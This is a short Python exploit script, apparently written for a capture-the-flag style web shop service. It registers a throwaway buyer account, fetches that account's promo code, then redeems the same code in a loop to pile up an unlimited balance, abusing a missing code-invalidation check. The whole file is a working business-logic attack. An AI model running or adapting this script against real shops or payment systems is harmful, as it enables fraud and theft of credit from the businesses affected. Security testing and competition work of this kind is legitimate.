#!/usr/bin/env python3
import sys, random, string, requests

host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = sys.argv[2] if len(sys.argv) > 2 else "8090"
count =int(sys.argv[3]) if len(sys.argv) > 3 else 10
BASE = f"http://{host}:{port}"

s = requests.Session()
username = "att_" + "".join(random.choices(string.ascii_lowercase, k=6))

# 1. register buyer (random username чтобы не было 409)
r = s.post(f"{BASE}/api/register", json={
    "username": username, "password": "password123", "role": "buyer"
})
print(r.status_code, r.text[:200])

# 2. get promo code
r = s.get(f"{BASE}/api/account")
print(r.status_code, r.text[:300])
code = r.json()["promo"]["code"]
print(f"promo: {code}")

# 3. reuse same code without invalidate -> infinite balance
for i in range(count):
    r = s.post(f"{BASE}/api/promo/credit", json={"code": code})
    print(f"credit {i}: {r.status_code} {r.text[:100]}")

print(s.get(f"{BASE}/api/me").json())
print(username, "password123")
